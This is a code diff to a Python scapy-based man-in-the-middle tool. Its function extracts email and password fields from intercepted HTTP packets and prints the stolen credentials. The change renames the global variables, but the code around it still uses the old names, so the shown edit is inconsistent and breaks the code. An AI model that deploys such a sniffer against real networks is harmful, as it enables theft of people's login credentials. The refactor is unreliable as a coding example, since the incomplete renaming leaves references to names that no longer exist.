@@ -3,8 +3,8 @@ from scapy.all import *
 
 from src.mitm.utils import get_mac
 
-login = ""
-password = ""
+user_login = ""
+user_password = ""
 login_field = "email="
 password_field = "passwd="
 
@@ -14,8 +14,8 @@ def get_index(buff, subbuff):
 
 
 def get_http_credentials(pkt):
-    global login
-    global password
+    global user_login
+    global user_password
     global password_field
     global login_field
     full_str_credentials = ""
@@ -45,7 +45,7 @@ def get_http_credentials(pkt):
                        len(full_str_credentials)):
             password = password + full_str_credentials[k]
 
-        print("user login: " + login + " | user password: " + password)
+        print("user user_login: " + login + " | user user_password: " + password)
         sys.exit(1)
 
     else:
